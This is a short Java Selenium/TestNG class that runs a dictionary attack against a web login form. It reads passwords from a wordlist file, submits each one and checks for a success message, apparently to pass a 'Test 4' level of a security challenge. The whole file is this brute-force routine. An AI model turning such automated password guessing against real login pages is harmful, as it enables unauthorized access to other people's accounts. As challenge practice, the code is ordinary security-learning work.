package com.pack.test;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Properties;
import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.ie.InternetExplorerDriver;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.phantomjs.PhantomJSDriver;
import org.testng.annotations.Test;

public class AutoLogin {
  @Test
  public void autoLogin() throws InterruptedException {
	  
	  
	  
	  
	  Properties prop = new Properties();
	  try{
		  FileReader in = new FileReader("D:\\security.properties");
		  prop.load(in);
		  
	  } catch(Exception e){
		  e.printStackTrace();
	  }
	  
	  
	  
	  
	  
	  
	  
	  
	  BufferedReader br = null;

      try {

          String sCurrentLine;

          br = new BufferedReader(new FileReader("D:\\cain.txt"));

          while ((sCurrentLine = br.readLine()) != null) {
        	  File file = new File("D:/IEDriverServer.exe");
        	  System.setProperty("webdriver.ie.driver", file.getAbsolutePath());
        	  WebDriver driver = new InternetExplorerDriver();
//        	  File file = new File("D:/phantomjs.exe");  
//        	  System.setProperty("phantomjs.binary.path", file.getAbsolutePath());
//        	  WebDriver driver = new PhantomJSDriver();
        	  
        	  driver.get(prop.getProperty("url"));
//        	  driver.manage().window().maximize();
        	  driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
        	  
        	  WebElement password = driver.findElement(By.xpath("html/body/center[3]/form/input[1]"));
        	  
        	  
        	  
              System.out.println(sCurrentLine);
              password.sendKeys(sCurrentLine);
              Thread.sleep(1500);
        	  WebElement logInBtn = driver.findElement(By.xpath("html/body/center[3]/form/input[2]"));
        	  logInBtn.click();
//        	  driver.close();
        	  WebElement test4 = driver.findElement(By.xpath("html/body/center[2]/b"));
        	  String texttest4 = test4.getText();
        	  System.out.println(texttest4);
        	  if(texttest4.equals("Test 4 (Good! Now you need to look deeper!)")){
        		  driver.quit();
        		  
        	  }else{
        		  Thread.sleep(35500000);
        	  }
        	  
          }

      } catch (IOException e) {
          e.printStackTrace();
      } finally {
          try {
              if (br != null)br.close();
          } catch (IOException ex) {
              ex.printStackTrace();
          }
      }

	  
	  
	  
	  
	  
	  
	  

	  
	
	  
	 
	  
  }
}
